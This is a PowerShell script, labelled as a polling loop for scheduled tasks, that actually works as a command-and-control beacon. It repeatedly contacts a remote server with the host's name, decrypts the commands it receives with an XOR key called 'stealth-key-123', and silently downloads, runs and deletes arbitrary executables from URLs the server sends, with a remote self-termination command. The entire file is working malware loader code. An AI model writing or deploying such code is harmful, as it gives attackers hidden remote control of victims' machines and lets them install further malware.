# Polling loop for scheduled task execution
# Variables injected at runtime: $url, $hostname, $key

param(
    [string]$Url,
    [string]$Hostname,
    [string]$Key = "stealth-key-123"
)

# Load decrypt function (or inline if needed)
. $PSScriptRoot\decrypt-xor.ps1

$backoff = 5

while ($true) {
    Start-Sleep -Seconds $backoff
    try {
        $resp = Invoke-WebRequest -Uri "$Url/command?host=$Hostname" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop

        if ($resp.Content) {
            $cmd = Decrypt-XOR $resp.Content $Key
            $backoff = 5

            if ($cmd.Trim() -eq 'DELETE') {
                exit
            }

            if ($cmd -like 'http*') {
                $tmp = "$env:TEMP\$(Get-Random).exe"
                Invoke-WebRequest -Uri $cmd -OutFile $tmp -TimeoutSec 10 -ErrorAction SilentlyContinue
                & $tmp -ErrorAction SilentlyContinue
                Remove-Item -Path $tmp -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {
        $backoff = [Math]::Min($backoff * 2, 60)
    }
}
